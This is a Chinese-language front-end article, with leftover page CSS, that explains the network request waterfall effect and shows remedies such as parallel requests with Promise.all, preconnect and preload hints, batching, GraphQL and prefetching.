td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="arduino-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff}.hljs-subst,.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#434f54}.hljs-attribute,.hljs-doctag,.hljs-keyword,.hljs-name,.hljs-selector-tag{color:#00979d}.hljs-addition,.hljs-built_in,.hljs-bullet,.hljs-code,.hljs-literal{color:#d35400}.hljs-link,.hljs-regexp,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-symbol,.hljs-template-variable,.hljs-variable{color:#00979d}.hljs-deletion,.hljs-quote,.hljs-selector-class,.hljs-selector-id,.hljs-string,.hljs-template-tag,.hljs-type{color:#005c5f}.hljs-section,.hljs-title{color:#800;font-weight:700}.hljs-comment{color:rgba(149,165,166,.8)}.hljs-meta-keyword{color:#728e00}.hljs-meta{color:#434f54}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-function{color:#728e00}.hljs-number{color:#8a7b52}</style><h2 data-id="heading-0">一、网络请求瀑布效应</h2>
<blockquote>
<p>网络请求中的瀑布效应（Waterfall Effect）是指多个网络请求按照串行顺序依次执行，后一个请求必须等待前一个请求完成后才能开始，形成类似瀑布般的层叠依赖关系。</p>
</blockquote>
<h3 data-id="heading-1">1.瀑布效应的表现</h3>
<p>在浏览器开发者工具的 Network 面板中，你会看到请求像瀑布一样一个接一个地排列。</p>
<pre><code class="hljs language-csharp" lang="csharp"> <span class="hljs-comment">// ❌ 瀑布效应示例</span>
  <span class="hljs-function"><span class="hljs-keyword">async</span> function <span class="hljs-title">loadData</span>()</span> {
    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> fetchUser()           <span class="hljs-comment">// 1秒</span>
    <span class="hljs-keyword">const</span> profile = <span class="hljs-keyword">await</span> fetchProfile(user.id)  <span class="hljs-comment">// 1秒 (等待user完成)</span>
    <span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">await</span> fetchPosts(user.id)      <span class="hljs-comment">// 1秒 (等待profile完成)</span>
    <span class="hljs-comment">// 总耗时: 3秒</span>
  }
</code></pre>
<h3 data-id="heading-2">2.常见场景</h3>
<blockquote>
<p><strong>依赖链式请求</strong></p>
</blockquote>
<pre><code class="hljs language-csharp" lang="csharp"> <span class="hljs-comment">// 每个请求依赖上一个请求的结果</span>
  <span class="hljs-keyword">const</span> userId = <span class="hljs-keyword">await</span> getUserId()
  <span class="hljs-keyword">const</span> userData = <span class="hljs-keyword">await</span> getUserData(userId)
  <span class="hljs-keyword">const</span> userPermissions = <span class="hljs-keyword">await</span> getPermissions(userData.roleId)
</code></pre>
<blockquote>
<p><strong>组件嵌套加载</strong></p>
</blockquote>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 父组件加载完才能加载子组件数据</span>
ParentComponent mounted → fetch parent <span class="hljs-keyword">data</span>
↓
ChildComponent mounted → fetch child <span class="hljs-keyword">data</span>
↓
GrandchildComponent mounted → fetch grandchild <span class="hljs-keyword">data</span>
</code></pre>
<blockquote>
<p><strong>资源依赖加载</strong></p>
</blockquote>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- HTML加载 → CSS加载 → 字体加载 → 图片加载 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"styles.css"</span>&gt;</span>
↓
@font-face { url('font.woff2') }
↓
background-image: url('bg.jpg')
</code></pre>
<h2 data-id="heading-3">二、瀑布效应的危害</h2>
<h3 data-id="heading-4">1. 危害</h3>
<p>瀑布效应的危害</p>
<ol>
<li>页面加载慢：总耗时 = 所有请求时间之和</li>
<li>用户体验差：长时间白屏或loading状态</li>
<li>资源浪费：网络带宽未充分利用</li>
<li>性能瓶颈：成为页面性能的主要限制因素</li>
</ol>
<h2 data-id="heading-5">三、如何优化瀑布效应</h2>
<h3 data-id="heading-6">1. 并行请求（最常用）</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// ✅ 将独立请求改为并行</span>
async function <span class="hljs-built_in">loadData</span>() {
    const <span class="hljs-selector-attr">[user, profile, posts]</span> = await Promise<span class="hljs-selector-class">.all</span>([
      fetchUser(),
      <span class="hljs-built_in">fetchProfile</span>(),
      <span class="hljs-built_in">fetchPosts</span>()
    ])
    <span class="hljs-comment">// 总耗时: 1秒（最慢的那个请求）</span>
}
</code></pre>
<h3 data-id="heading-7">2. 预加载/预连接</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- DNS预解析 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"dns-prefetch"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://api.example.com"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 预连接 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preconnect"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://api.example.com"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 预加载关键资源 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"critical.css"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"style"</span>&gt;</span>
</code></pre>
<h3 data-id="heading-8">3. 资源内联</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 关键CSS内联到HTML中，避免额外请求 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
  <span class="hljs-selector-class">.critical-styles</span> { <span class="hljs-comment">/* ... */</span> }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-9">4. 请求合并</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// ❌ 多次请求</span>
<span class="hljs-keyword">const</span> user1 = <span class="hljs-keyword">await</span> fetchUser(<span class="hljs-number">1</span>)
<span class="hljs-keyword">const</span> user2 = <span class="hljs-keyword">await</span> fetchUser(<span class="hljs-number">2</span>)
<span class="hljs-keyword">const</span> user3 = <span class="hljs-keyword">await</span> fetchUser(<span class="hljs-number">3</span>)

<span class="hljs-comment">// ✅ 批量请求</span>
<span class="hljs-keyword">const</span> users = <span class="hljs-keyword">await</span> fetchUsers([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])
</code></pre>
<h3 data-id="heading-10">5. GraphQL（按需获取）</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 一次请求获取所有需要的数据</span>
<span class="hljs-keyword">const</span> { user, profile, posts } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">graphqlQuery</span>(<span class="hljs-string">`
    query {
      user { id, name }
      profile { avatar, bio }
      posts { title, content }
    }
`</span>)
</code></pre>
<h3 data-id="heading-11">6. 数据预取</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 在用户操作前提前加载数据</span>
<span class="hljs-built_in">onMouseEnter</span>() {
    <span class="hljs-comment">// 鼠标悬停时预加载下一页数据</span>
    <span class="hljs-built_in">prefetchNextPage</span>()
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>